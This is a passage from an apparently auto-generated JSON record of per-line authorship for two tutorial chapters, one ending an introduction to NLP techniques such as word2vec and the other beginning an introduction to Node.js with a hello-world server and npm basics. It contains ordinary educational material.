        "content": "This ability to quantify and categorize semantic similarity allows computers to infer beyond just synonyms."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003cp align\u003d\"center\"\u003e"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    \u003cpic src\u003d\"word2vec.png\" alt\u003d\"word2vec visualization for antonyms\" width\u003d\"90%\"\u003e"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "j-lum"
        },
        "content": "      \u003csub\u003e\u003ci\u003eFigure 5. word2vec visualization for antonyms\u003c/i\u003e\u003c/sub\u003e"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    \u003c/pic\u003e"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003c/p\u003e"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "j-lum"
        },
        "content": "A simplified visualization of words in vector space shows that not only are words related in meaning close together, their antonyms are clustered together as well\u003csup\u003e[11](#footnote11)\u003c/sup\u003e. "
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "j-lum"
        },
        "content": "This implies that word vectors can be somewhat meaningfully combined by just using simple vector addition."
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Word2vec has been used to analyze behaviour on e-commerce sites as human do not tend to browse for random items but purchase items that are related."
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "j-lum"
        },
        "content": "### Applications of NLP"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "j-lum"
        },
        "content": "#### Input methods editors, e.g. Chinese, Japanese and Korean"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Modern input method editors(IMEs) do more than simply translating input to output in the respective language."
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "j-lum"
        },
        "content": "By tackling the syntactic and relational elements of natural language, IMEs provide autocomplete functionality by suggesting words that are related or occur together frequently. "
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "j-lum"
        },
        "content": "For example, typing \"*beijing*\" in Moon IME, a Chinese IME, will bring up \"*olympics*\" as a possible suggestion\u003csup\u003e[12](#footnote12)\u003c/sup\u003e."
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "j-lum"
        },
        "content": "#### Indexing and information retrieval, e.g. Google\u0027s page rank and normalization of search terms"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Search terms on Google are grouped together by semantic similarity in real time at volume to identify trends worldwide. "
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "j-lum"
        },
        "content": "This is achieved with techniques similar to **word2vec**. "
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "j-lum"
        },
        "content": "#### Aggregation and clustering of documents, e.g. Cambridge Analytica, Google News"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Techniques like **doc2vec**\u003csup\u003e[13](#footnote13)\u003c/sup\u003e build upon **word2vec** and provide a representation of paragraphs in vector space."
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Similar to **word2vec**, this enables classification of documents and paves the road to powerful information retrieval techniques. "
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "j-lum"
        },
        "content": "#### Machine translation, e.g. Google Translate"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "j-lum"
        },
        "content": "**seq2seq**\u003csup\u003e[3](#footnote3)\u003c/sup\u003e, a algorithm developed by Google, transforms a sequence to another. "
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "j-lum"
        },
        "content": "This family of techniques uses special \u003ctooltip content\u003d\"an artifical neural networks is a computer system made up of a number of simple, highly connected processing elements which translate information to some form of desired output\"\u003e\u003ci\u003eartificial neural network\u003c/i\u003e\u003c/tooltip\u003e   architectures to model sentences.  "
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "j-lum"
        },
        "content": "#### Automated customer support, e.g. ChatBot, NanoRep"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "j-lum"
        },
        "content": "Human-curated databases (e.g. **WordNet**) are used together with techniques like **word2vec** to extract actionable words or phrases\u003csup\u003e[14](#footnote14)\u003c/sup\u003e. "
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "j-lum"
        },
        "content": "For example, the two possible input from users regarding a replacement for a digital banking token: "
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003e * I want to replace my token."
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003e * My old token is broken. "
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "j-lum"
        },
        "content": "can be mapped back to the same intent to which a predefined response can be given. "
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003cp align\u003d\"center\"\u003e"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    \u003cpic src\u003d\"dbsChatbot.png\" alt\u003d\"DBS chatbot responding to two different messages with a similar intent\" width\u003d\"90%\"\u003e"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "j-lum"
        },
        "content": "      \u003csub\u003e\u003ci\u003eFigure 6. DBS chatbot responding to two different messages with a similar intent\u003c/i\u003e\u003c/sub\u003e"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    \u003c/pic\u003e"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003c/p\u003e"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "j-lum"
        },
        "content": "## What\u0027s Next"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "j-lum"
        },
        "content": "1. **Get an intuition for linguistics**"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    [The Language Instinct](https://stevenpinker.com/publications/language-instinct) by Steven Pinker provides accessible insight about how humans learn language and the basics of formal linguistics. "
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    Learn about how to deconstruct language into formal structures for critical analysis through engaging examples."
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    "
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "j-lum"
        },
        "content": "1. **Visually explore the themes present in NLP**"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    "
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    Stanford\u0027s [CoreNLP](https://corenlp.run/) provides a visual representation of NLP techniques."
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    Explore how sentences are annotated with *parts-of-speech* tags and see the output of a constituency parse."
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    "
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "j-lum"
        },
        "content": "1. **Take an online course on NLP**"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    Stanford University offers [CS224n: Natural Language Processing with Deep Learning](https://web.stanford.edu/class/cs224n/) online."
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    This course provides an introduction to modern techniques in NLP. "
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "j-lum"
        },
        "content": "     "
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "j-lum"
        },
        "content": "1. **Experiment with NLP libraries**"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    The aforementioned [CoreNLP](https://stanfordnlp.github.io/CoreNLP/) library is a good starting point for developers comfortable in Java."
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    For a simple and productive experience, [spaCy](https://spacy.io/) is a Python library suitable for experimentation and rapid prototyping."
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    "
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "j-lum"
        },
        "content": "    "
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "j-lum"
        },
        "content": "## References"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "j-lum"
        },
        "content": ""
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote1\"\u003e[1]\u003c/a\u003e: https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6562150/ \u003cbr/\u003e"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote2\"\u003e[2]\u003c/a\u003e: https://azure.microsoft.com/en-us/services/bot-service/ \u003cbr/\u003e"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote3\"\u003e[3]\u003c/a\u003e: https://github.com/google/seq2seq \u003cbr/\u003e"
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote4\"\u003e[4]\u003c/a\u003e: https://www.cs.bham.ac.uk/~pjh/sem1a5/pt2/pt2_intro_morphology.html \u003cbr/\u003e"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote5\"\u003e[5]\u003c/a\u003e: https://catalog.ldc.upenn.edu/docs/LDC95T7/cl93.html \u003cbr/\u003e"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote6\"\u003e[6]\u003c/a\u003e: https://www.microsoft.com/en-us/research/project/nlpwin/ \u003cbr/\u003e"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote7\"\u003e[7]\u003c/a\u003e: https://medium.com/huggingface/learning-meaning-in-natural-language-processing-the-semantics-mega-thread-9c0332dfe28e \u003cbr/\u003e"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote8\"\u003e[8]\u003c/a\u003e: https://www.aclweb.org/anthology/N13-1136 \u003cbr/\u003e"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote9\"\u003e[9]\u003c/a\u003e: https://wordnet.princeton.edu/ \u003cbr/\u003e"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote10\"\u003e[10]\u003c/a\u003e: https://papers.nips.cc/paper/5021-distributed-representations-of-words-and-phrases-and-their-compositionality.pdf \u003cbr/\u003e"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote11\"\u003e[11]\u003c/a\u003e: https://lamyiowce.github.io/word2viz/ \u003cbr/\u003e"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote12\"\u003e[12]\u003c/a\u003e: https://www.aclweb.org/anthology/P18-4024.pdf \u003cbr/\u003e"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote13\"\u003e[13]\u003c/a\u003e: https://cs.stanford.edu/~quocle/paragraph_vector.pdf \u003cbr/\u003e"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "j-lum"
        },
        "content": "\u003ca name\u003d\"footnote15\"\u003e[14]\u003c/a\u003e: https://www.microsoft.com/en-us/research/wp-content/uploads/2016/09/intent-detection-semantically.pdf \u003cbr/\u003e"
      }
    ],
    "authorContributionMap": {
      "j-lum": 197,
      "jamessspanggg": 1
    }
  },
  {
    "path": "contents/node/nodejs.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "  title: Introduction to Node"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "# Introduction to Node"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Authors: [Rachael Sim](https://github.com/rachx), [Ang Ze Yu](https://github.com/ang-zeyu)\u003cbr\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Reviewers: [Shradheya Thakre](https://github.com/tshradheya), [Nicholas Chua](https://github.com/nicholaschuayunzhi), [Sam Yong](https://github.com/mauris), [Daryl Tan](https://github.com/openorclose), [Iskandar Zulkarnaien](https://www.github.com/iskandarzulkarnaien), [Tan Yuan Hong](https://www.github.com/le0tan)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbox type\u003d\"info\" light\u003e\u003cmd\u003e"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "This chapter assumes that the reader is familiar with JavaScript and asynchronous programming. If you are not familiar with asynchronous programming, a good resource to checkout is the [asynchronous programming section of the You Don\u0027t Know JS guide ](https://github.com/getify/You-Dont-Know-JS/tree/2nd-ed/sync-async) as asynchronous programming is key in Node.\u003c/md\u003e"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What is Node?"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003e*Node* is a JavaScript runtime built on Chrome’s V8 JavaScript engine. It uses an event-driven, non-blocking I/O model that makes it lightweight and efficient. \u003csub\u003e--https://nodejs.org\u003c/sub\u003e"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Node is mostly used in back-end and server side scenarios. For example, LinkedIn mobile app backend is built on Node and Uber built its massive matching system between customers and drivers on Node. However, Node can also be used in the front-end to automate tasks such as building, testing, pre and post processing code."
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why use Node?"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Now that we know what Node is, let us look at some benefits it has to offer."
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 1: Easy to Get Started"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "To install Node, simply download the installer from the [official Node website](https://nodejs.org/en/download/) based on your OS and run it. This installs both Node and npm. Npm is a tool which will help you to search, install and manage node packages, which will be further explored [later](#benefit-5-easy-dependency-management-with-npm)."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "The following example demonstrates how a Node application imports required modules, creates a server to listen for a client\u0027s request, and then sends back a \u0027Hello World\u0027 response."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbox type\u003d\"info\" header\u003d\"A Simple Hello World Server \u003csmall\u003efrom [codeburst](https://codeburst.io/node-js-by-example-part-1-668376cd4f96)\u003c/small\u003e\" light\u003e"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "Create a file `server.js` with following content:"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "const http \u003d require(\u0027http\u0027);"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "const hostname \u003d \u0027127.0.0.1\u0027;"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "const port \u003d 3000;"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "const server \u003d http.createServer(function(req, res) {"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "  res.statusCode \u003d 200;"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "  res.setHeader(\u0027Content-Type\u0027, \u0027text/plain\u0027);"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "  res.end(\u0027Hello World\u0027);"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "});"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "server.listen(port, hostname, function() {"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "  console.log(\u0027Server running at http://\u0027 + hostname + \u0027:\u0027 + port + \u0027/\u0027);"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "});"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "After you save the file, you can execute it from your terminal:"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "$ node server.js"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "Server running at http://127.0.0.1:3000/"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "To test the server, open a browser tab and navigate to http://localhost:3000/. You should see \u0027Hello world\u0027."
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "Read on to find out about how to incorporate external dependencies, manage them and use Node\u0027s module system to organize your code."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 2: Avoid Synchronization Problems and Overheads"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cfigure\u003e"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cimg src\u003d\"eventloop.png\" width\u003d\"74%\" class\u003d\"mx-auto mt-3 mb-2 d-block rounded\" /\u003e"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cfigcaption class\u003d\"text-center\"\u003e\u003csmall\u003e"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Illustration of node\u0027s event loop from [these slides](https://www.slideshare.net/DevCentralAMD/introduction-to-nodejs-41469620)\u003c/small\u003e"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/figcaption\u003e"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/figure\u003e"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Node is designed to be **event-driven**. When an \u003ctooltip content\u003d\"e.g. when a I/O operation is complete, or a timer fires\"\u003eevent\u003c/tooltip\u003e occurs (_Operation Complete_ above), the event handler previously registered with the event is enqueued to be run by the [\u003ctooltip content\u003d\"where JavaScript code is executed\"\u003eevent loop\u003c/tooltip\u003e](https://medium.com/the-node-js-collection/what-you-should-know-to-really-understand-the-node-js-event-loop-and-its-metrics-c4907b19da4c) (_Trigger Callback_), which is single-threaded."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "This means that we can avoid thread overheads and synchronization problems such as \u003ctooltip content\u003d\"a situation where some threads are blocked due to needing access to the same locks\"\u003edeadlocks\u003c/tooltip\u003e and \u003ctooltip content\u003d\"a situation where multiple operations by different threads are performed on one resource in indeterministic order, potentially causing unexpected changes to the resource\"\u003erace conditions\u003c/tooltip\u003e."
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "### Benefit 3: Fast for I/O Intensive Programs"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "I/O requests made in other languages such as Python or Java are typically blocking, which means the program remains idle (in the same thread) until the I/O operation completes."
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "In contrast, node allows for a **non-blocking** I/O model with its event-driven structure."
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "I/O requests are delegated to other systems (e.g. file system and databases). While an I/O operation is incomplete, the event loop can still process subsequent requests. When the I/O request is complete, the handler registered with the request is then scheduled to be executed on the event loop."
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 4: Use JavaScript for Both Front and Back-end Development"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Using Node for back-end development makes it possible to share common code functionality between the front-end and back-end, which leads to less code maintainence. Since the same code base is shared, it may hence also lead to a more multidisciplinary team that is familiar with both front and back-end development, reducing the potential communication overhead involved."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 5: Easy Dependency Management With npm"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "Node Package Manager (npm) is used to"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* Search for node packages online"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* Install node packages from the command line, manage versions and dependencies effectively and easily"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Anyone who wants to use your project would only need to run the following command in the command shell to load the project dependencies."
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "$ npm install"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "This command will locate the `package.json` file (a file that contains all metadata information about a Node application) in the root directory and install all the dependencies specified in it."
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "A basic `package.json` has the following structure."
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "```json"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "{"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "  \"name\": \"folder_name\","
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "  \"version\": \"1.0.0\","
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "  \"description\": \"\","
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "  \"main\": \"index.js\","
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "  \"scripts\": {"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "    \"test\": \"echo \\\"Error: no test specified\\\" \u0026\u0026 exit 1\""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "  },"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  \"keywords\": [\"promise\", \"lock\"],"
      },
      {
        "lineNumber": 120,
        "author": {
